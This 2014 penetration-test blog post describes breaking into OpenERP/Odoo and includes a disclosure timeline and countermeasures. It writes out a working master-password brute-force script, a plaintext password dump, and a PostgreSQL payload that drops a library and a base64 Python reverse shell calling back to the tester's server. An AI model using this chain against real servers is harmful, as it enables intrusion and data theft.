---
layout: post
title:  "OpwnERP: Going from Unauthenticated Remote Access to RCE with Odoo ( Formerly OpenERP )"
date:   2014-12-08 12:00:00 -0500
categories: openerp security postgresql rce
description: Taking OpenERP 7.0 from an unauthenticated remote session to full remote shell
comments: true
image: images/openerp-post.jpg
tags:
  - openerp
  - odoo
  - web
  - postgresql
  - rce
  - security
  - pentest
---

## Overview

I have used OpenERP in my business for the past several years, and have recommended it to several clients. While I've had a love/hate relationship with it, the recent versions are really starting to shine. I decided that before I actually host my copy of OpenERP on the open internet, I'd do a penetration test and see if I could break into it.

My goal was simple: figure out how to break in remotely and get full RCE.

After a weekend of steady brutalizing, I managed to go from having unauthenticated external access, to
getting full control of the databases on a system, to then getting shell access on the server hosting
OpenERP. I've uncovered a few design weaknesses, some vulnerabilities, and some (I think) clever
hackery to put all together and get access. First I'll list out a play by play of what I found, and how I
did it. Then I'll give a summary of the bugs, and recommended fixes (both for OpenERP and for end
users).

*UPDATE*: This was sent over to Odoo, and they went through and fixed most of the issues.  See the disclosure timeline and information at the end.

## Actual Exploitation

### Default Admin Password

The first issue is that during a new install, you are presenting with a screen to set up a new database. There is a field for master password, but it is prepopulated.

![First Screen](/images/CreateDatabase.jpg)

After you fill that out, you are logged into the database.

![Logged In](/images/LoggedIn.jpg)

The master password gives you access to perform database operations (creating new databases, dropping databases, backing up, and restoring).  You are never asked to change the master password, which by default is 'admin', and gives total and complete access to all the databases. If you don't know better, you think you set the admin password on the initial screen, and never change the password.

### No Brute Force Detection on Master Password

The master password is easily the most important credential on the system. With it, you can get full access to all of the customer data.  Suppose whomever configured OpenERP did go back and set a different master password.  How hard would it be to brute force?

As an example, I tried to drop a database, and intercepted the following POST:

![Post in Burp](/images/OpenERPPost1.jpg)

Now I modified it, and put in a dummy database name.

![Post in Burp](/images/OpenERPPost2.jpg)

This way, even if I am successful, I won't actually drop a real database. After submitting it, I get the following result.

![Post in Burp](/images/OpenERPPost3.jpg)

That gives us our “bad password” criteria. Here is the result if I submit a fake database with the correct password.

![Post in Burp](/images/OpenERPPost4.jpg)

That gives us our “good password” criteria. From here, it is trivial to load up a word list in BurpSuite and brute force the password. To make things even easier (and on the advice of some helpful people in ##security on Freenode), I wrote the following python script to brute force the password using a word list:

{% highlight python %}
#!/usr/bin/python
import sys, requests, json
url = 'http://10.110.6.13:8069/web/database/drop'
headers = {'Accept':'application/json, text/javascript, */*; q=0.01',
      'Accept-Encoding':'gzip, deflate',
      'Referer': 'http://10.110.6.13:8069/web/database/manager',
      'Content-Type': 'application/json; charset=UTF-8'}
wordlist = open(sys.argv[1], "r")
attempt = 0
for word in wordlist:
  attempt += 1
  print("Attempt number %s: %s" % (attempt, word.strip()))
  data = {'jsonrpc':'2.0',
      'method':'call',
      'params':
        {'fields':
          [{'name':'drop_db', 'value':'InvalidDB'},
          {'name':'drop_pwd', 'value':word.strip()}]},
      'id':123456789}
  resp = requests.post(url, data=json.dumps(data), headers=headers)
  result = resp.json()
  if not result['result']:
    print('Password is ' + word)
    exit(0)

{% endhighlight %}

This script manages about 50 passwords per second.  While this definitely isn't the *fastest* brute force, there are no slowdowns.  This could probably be modified to run multithreaded and get much higher speeds.  What does this show in OpenERP's log files?


    2014-09-08 16:46:07,196 752 INFO None werkzeug: 10.110.6.12 - - [08/Sep/2014 16:46:07] "POST /web/database/drop HTTP/1.1" 200 - 
    2014-09-08 16:46:07,212 752 INFO None werkzeug: 10.110.6.12 - - [08/Sep/2014 16:46:07] "POST /web/database/drop HTTP/1.1" 200 - 
    2014-09-08 16:46:07,229 752 INFO None werkzeug: 10.110.6.12 - - [08/Sep/2014 16:46:07] "POST /web/database/drop HTTP/1.1" 200 -
    2014-09-08 16:46:07,423 752 INFO None werkzeug: 10.110.6.12 - - [08/Sep/2014 16:46:07] "POST /web/database/drop HTTP/1.1" 200 -


The last line is the successful one, with the fake database name.  In other words, failed login attempts, successful login attempts, and invalid login attempts look exactly the same in the log files.  This would make it very difficult to use something like Fail2ban to automatically block out an attacker.

So with a weak password, it is only a (short) matter of time before an attacker can gain access to the master password.  A hybrid attack using something like John the Ripper for passwords will take longer, but will still crack many passwords.  The brute forcing itself doesn't impact OpenERP's performance on a decent system, so the end users would have no idea they were under attack.

### Downloading The Databases

Now that we have the master password, we can easily download all of the client data.  This could include personal information, credit card numbers, social security numbers, financials, etc.  It will also give us access into OpenERP itself.

Here we can go back into the Database Manager, and backup the database.

![Backup Screen](/images/OpenERPBackup.jpg)

This will give us a PostgreSQL dump that we can import locally, and examine to our heart's content.  If all an attacker was doing was looking to steal data, they could stop here.  Let's see how the user table looks.  First, we import it with


    [postgres@localhost ~]$ createdb OpwnedERP 
    [postgres@localhost ~]$ gunzip -c /tmp/TestDatabase_2014-09-08_17-12-00Z.dump | psql -d OpwnedERP 


Next, we'll connect in and look at the database.


    [postgres@localhost ~]$ psql -d OpwnedERP 
    psql (9.3.5) 
    Type "help" for help. 

    OpwnedERP=# select login, password from res_users; 
     login  | password 
    --------+---------- 
     public | 
     admin  | s3cure 
    (2 rows) 

Well, that makes things really easy.  By default, the passwords are all stored in plain text.  Using this, we can log in to the database in OpenERP as the admin user.

### Getting Remote Shell Access

Now that we can get into the system using legitimate credentials, we are going to use “Server Actions” to execute python code that will give us the ability to write malicious SQL, upload a PostgreSQL library, upload a simple python reverse shell script, and finally launch it.  

We'll go into Settings → Users → Administrator

![User Screen](/images/OpenERPUsers.jpg)

You click on Administrator, and click Edit.  Put a checkbox next to Technical Features, save, and refresh.

![Admin Screen](/images/OpenERPAdmin.jpg)

Now the real fun begins.  You go to Settings → Technical → Actions → Server Actions, and click Create.  For the name, put whatever you want, and for Base Model, pick ir.actions.server (this will associate it with this menu, which should go pretty much unnoticed).  

Under Python Code, we'll enter in the attack code.  We can see that we are very limited in what functionality we can use, so we can't just insert a one line Meterpreter script.  Everything put in the code snippet will be run with OpenERP's safe_eval, which blacklists most modules after compiling bytecode.  We are locked down to only using the objects listed.  The database cursor ("cr") has a function called "execute", which will let us execute arbitrary SQL commands, though.

![Server Action](/images/OpenERPServerAction.jpg)

Using this, we use the following code

{% highlight python %}
cr.execute(''' 
CREATE TABLE res_support ( bar oid, id SERIAL, name varchar(20), CONSTRAINT id PRIMARY KEY (id) ) WITHOUT OIDS; 
''') 
cr.execute(''' 
create or replace function blob_write(lbytea bytea) 
   returns oid 
   volatile 
   language plpgsql as 
$f$ 
   declare 
      loid oid; 
      lfd integer; 
      lsize integer; 
begin 
   if(lbytea is null) then 
      return null; 
   end if; 

   loid := lo_create(0); 
   lfd := lo_open(loid,131072); 
   lsize := lowrite(lfd,lbytea); 
   perform lo_close(lfd); 
   return loid; 
end; 
$f$; 
''') 
cr.execute(''' 
CREATE CAST (bytea AS oid) WITH FUNCTION blob_write(bytea) AS ASSIGNMENT; 
''') 


cr.execute(''' 
INSERT INTO res_support (bar, name) VALUES (decode('<60 pages of base64 code>', 'base64'), 'pl.so'); 
''') 
cr.execute(''' 
insert into res_support (bar, name) VALUES (decode('aW1wb3J0IHNvY2tldCwgc3RydWN0CgpzPXNvY2tldC5zb2NrZXQoMiwxKQpzLmNvbm5lY3QoKCcx 
MC4xMTAuNi4yNycsNDQzKSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMu 
cmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CiAgICBkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsn 
cyc6c30pCgo=','base64'), 'ex.py'); 
''') 
cr.execute(''' 
select lo_export((select bar from res_support where name = 'pl.so'), '/tmp/pl.so'); 
''') 
cr.execute(''' 
select lo_export((select bar from res_support where name = 'ex.py'), '/tmp/ex.py'); 
''') 
cr.execute(''' 
CREATE OR REPLACE FUNCTION system(cstring) RETURNS integer AS 
    '/tmp/pl.so', 'system' LANGUAGE 'c' STRICT; 
''') 
cr.execute(''' 
select system('/usr/bin/python /tmp/ex.py') 
''') 
{% endhighlight %}

What we are actually doing is:

1. Create a table with a field of type 'oid', which can contain binary data in a raw format, and which can be exported directly to the disk on the server.
2. Create a function to convert bytea to oid.  
3. Create a class that will automagically convert bytea to oid using the above function.  When we decode base64, it will go into the bytea format. This will allow us to directly import base64 straight back into a binary oid.
4. This is inserting a base64 conversion of plperl.so for PostgreSQL 9.3.5.  This is what comes with Ubuntu 14.04 Server.  If you need to figure out which version of PostgreSQL is under the hood to get the correct file to use, you can use something like this, which will put the results into Settings → Technical → Parameters → System Parameters:

{% highlight python %}
cr.execute('''
INSERT INTO ir_config_parameter (key, value) VALUES ('Version', VERSION());
''')
{% endhighlight %}

Considering that most OpenERP installations are running Ubuntu, worst case scenario you can spin up a matching VM and get the .so file.  This file gives us the ability to launch shell commands.  To generate the base64 for this, use this command:

    [danny@localhost ~]$ base64 plperl.so 

5. Uploading the attack script.  This is just a small python script that sets up a reverse tunnel over port 443 back to my waiting server.
6. This exports the library into a file at /tmp
7. This exports the script to a file at /tmp
8. This creates a PostgreSQL function bound to the library that we uploaded earlier to execute shell commands, and
9. This uses that to run the script, which then connects back to me.

After I save the server action, I click Add in the 'More' menu.  Refresh the page, and your new piece of code should be ready to run right there.  Make sure you are ready to receive the exploit, and launch it.

![Run Attack SQL Server Action](/images/OpenERPServerAction.jpg)

![Metasploit Receiver](/images/OpenERPMetasploit.jpg)

And in the logs:

    2014-09-09 00:33:21,379 752 INFO TestDatabase werkzeug: 10.110.6.12 - - [09/Sep/2014 00:33:21] "POST /web/action/run HTTP/1.1" 200 - 
    2014-09-09 00:33:21,415 752 INFO TestDatabase werkzeug: 10.110.6.12 - - [09/Sep/2014 00:33:21] "POST /web/dataset/call_kw/ir.actions.server/search_read HTTP/1.1" 200 - 
    2014-09-09 00:33:21,515 752 INFO TestDatabase werkzeug: 10.110.6.12 - - [09/Sep/2014 00:33:21] "POST /web/dataset/search_read HTTP/1.1" 200 - 

Nothing suspicious.  From here, I can further attack the box, or I can pivot and attack the rest of the internal network.

## Countermeasures

### Update to the latest version

This was all done on version 7 and version 8 of Odoo.  If you are still running these (latest is version 9), please upgrade to the latest immediately.  

### Lock down database admin area

Use a secure master password, and IP restrict /web/database to trusted IPs only.  If you are using nginx (you should be, at the very least for SSL) add the following to your nginx.conf:

    location ~ ^/(web/database/) {
                  allow 1.2.3.4;
                  deny all;
    }

Replace the 1.2.3.4 with your trusted IPs.

### Lock down Postgresql

By default, Odoo now doesn't give itself superadmin rights with Postgres, which prevents all of the Postgres exploits to get a remote shell.  Make sure you verify that the Odoo/OpenERP user is not running as superadmin.

    su - postgres
    psql

    postgres=# \du

If you see (odoo or openerp, depending on version):

                                 List of roles
     Role name |                   Attributes                   | Member of 
    -----------+------------------------------------------------+-----------
     odoo      | Superuser, Create role, Create DB              | {}
     openerp   | Superuser, Create role, Create DB              | {}
     postgres  | Superuser, Create role, Create DB, Replication | {}

Then you need to restrict the odoo or openerp users.  You'd clean it up with:

    postgres=# alter role odoo with nosuperuser;
    ALTER ROLE
    postgres=# alter role odoo with nocreaterole;
    ALTER ROLE

It should look like

    postgres=# \du
                                 List of roles
     Role name |                   Attributes                   | Member of 
    -----------+------------------------------------------------+-----------
     odoo      | Create DB                                      | {}
     postgres  | Superuser, Create role, Create DB, Replication | {}


## Disclosure Timeline

- 2014-09-09 Disclosed findings to Odoo
- 2014-09-10 Response addressing findings from Odoo security team, with timeline for fixes
- 2014-10-14 Odoo responded with most critical vulnerabilities fixed, with all being fixed and deployed on the 10-15.
- 2014-12-09 Disclosure date


